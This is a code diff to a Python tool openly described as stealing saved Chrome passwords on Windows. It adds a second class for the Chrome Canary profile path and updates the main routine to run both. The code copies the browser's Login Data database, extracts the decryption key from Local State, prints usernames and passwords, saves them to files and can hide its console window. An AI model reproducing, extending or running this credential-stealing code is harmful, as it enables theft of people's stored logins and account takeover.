@@ -25,9 +25,9 @@ This module steals chrome passwords on Windows.
 ~# python3 ChromePasswordsStealer.py --save-all --window -f passwords
 ~# python3 ChromePasswordsStealer.py
 
->>> from ChromePasswordsStealer import ChromePasswordsStealer
+>>> from ChromePasswordsStealer import ChromePasswordsStealer, ChromiumPasswordsStealer
 >>> stealer = ChromePasswordsStealer()
->>> stealer = ChromePasswordsStealer("passwords", True)
+>>> stealer = ChromiumPasswordsStealer("passwords", True)
 >>> stealer.get_database_cursor()
 >>> stealer.get_key()
 >>> for url, username, password in stealer.get_credentials(): print(url, username, password)
@@ -35,7 +35,7 @@ This module steals chrome passwords on Windows.
 >>> stealer.save_and_clean()
 """
 
-__version__ = "1.0.0"
+__version__ = "1.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -53,7 +53,7 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = ["ChromePasswordsStealer", "main"]
+__all__ = ["ChromePasswordsStealer", "ChromiumPasswordsStealer", "main"]
 
 print(copyright)
 
@@ -105,12 +105,14 @@ class ChromePasswordsStealer:
             "Default",
             "Login Data",
         )
+        self.save_db_filename = "chromedb"
+        self.save_key_file = "chromekeyfile"
 
         self.requete = (
             "SELECT origin_url, username_value, password_value FROM logins"
         )
         self.tempdb = join(_get_default_tempdir(), "chrome.db")
-        tempfile = self.tempfile = TemporaryFile(mode="w+", newline='')
+        tempfile = self.tempfile = TemporaryFile(mode="w+", newline="")
         self.tempcsv = writer(tempfile)
         self.save_all = save_all
 
@@ -132,16 +134,22 @@ class ChromePasswordsStealer:
             f"{self.user_name}_{self.time}.{extension}"
         )
 
-    def get_database_cursor(self) -> None:
+    def get_database_cursor(self) -> bool:
 
         """
         This function copies and connects to the Chrome password database.
         """
 
         tempdb = self.tempdb
-        copyfile(self.db_path, tempdb)
+        db_path = self.db_path
+
+        if not exists(db_path):
+            return False
+
+        copyfile(db_path, tempdb)
         connection = self.connection = connect(tempdb)
         self.cursor = connection.cursor()
+        return True
 
     def get_key(self) -> bytes:
 
@@ -239,12 +247,51 @@ class ChromePasswordsStealer:
         self.connection.close()
 
         if self.save_all:
-            copyfile(tempdb, get_filename("chromedb", "db"))
-            copyfile(self.key_file, get_filename("keyfile", "json"))
-            with open(get_filename("keyfile", "bin"), "wb") as keyfile:
+            copyfile(tempdb, get_filename(self.save_db_filename, "db"))
+            copyfile(self.key_file, get_filename(self.save_key_file, "json"))
+            with open(
+                get_filename(self.save_key_file, "bin"), "wb"
+            ) as keyfile:
                 keyfile.write(self.key or b"")
 
         remove(tempdb)
+
+
+class ChromiumPasswordsStealer(ChromePasswordsStealer):
+
+    """
+    This class steals chromium passwords on Windows.
+    """
+
+    def __init__(self, filename: str = None, *args, **kwargs):
+        super(ChromiumPasswordsStealer, self).__init__(
+            filename if filename else None, *args, **kwargs
+        )
+
+        user_data = self.user_data = join(
+            environ["USERPROFILE"],
+            "AppData",
+            "Local",
+            "Google",
+            "Chrome SxS",
+            "User Data",
+        )
+        self.key_file = join(
+            user_data,
+            "Local State",
+        )
+        self.db_path = join(
+            user_data,
+            "Default",
+            "Login Data",
+        )
+
+        self.save_db_filename = "chromiumdb"
+        self.save_key_file = "chromiumkeyfile"
+
+        self.filename = self.get_filename(
+            filename or "chromium_passwords", "csv"
+        )
 
 
 def parse_args() -> Namespace:
@@ -294,25 +341,38 @@ def main(argv: List[str] = argv[1:]) -> int:
         printf = partial(printf, end="\n")
 
     printf("Arguments parsed, mode console.", "INFO")
-    stealer = ChromePasswordsStealer(arguments.filename, arguments.save_all)
 
-    printf(f"Stealer created, save filename: {stealer.filename!r}")
-    printf(
-        f"Get DB path: {stealer.db_path!r}, Key file path: {stealer.key_file!r}",
-        "INFO",
-    )
+    stealers = (ChromePasswordsStealer, ChromiumPasswordsStealer)
+    filename = arguments.filename
+    save_all = arguments.save_all
+    stealer = None
+    counter = 0
+    while not isinstance(stealer, ChromiumPasswordsStealer):
+        stealer = stealers[counter](
+            f"{filename}{counter}" if filename is not None else None, save_all
+        )
+        counter += 1
 
-    stealer.get_database_cursor()
-    printf("DB connection done.")
+        printf(f"Stealer created, save filename: {stealer.filename!r}")
+        printf(
+            f"Get DB path: {stealer.db_path!r}, Key file path: {stealer.key_file!r}",
+            "INFO",
+        )
 
-    key = b16encode(stealer.get_key() or b"").decode("latin-1")
-    printf(f"Get encryption key: {key!r}")
+        if not stealer.get_database_cursor():
+            printf("DB not found...", state="NOK")
+            continue
 
-    for url, username, password in stealer.get_credentials():
-        printf(f"Get credentials for {url!r}: {username!r} {password!r}")
+        printf("DB connection done.")
 
-    stealer.save_and_clean()
-    printf("Temp files are cleaned, credentials are saved.", "INFO")
+        key = b16encode(stealer.get_key() or b"").decode("latin-1")
+        printf(f"Get encryption key: {key!r}")
+
+        for url, username, password in stealer.get_credentials():
+            printf(f"Get credentials for {url!r}: {username!r} {password!r}")
+
+        stealer.save_and_clean()
+        printf("Temp files are cleaned, credentials are saved.", "INFO")
 
     if not arguments.window:
         ShowWindow(GetConsoleWindow(), 1)
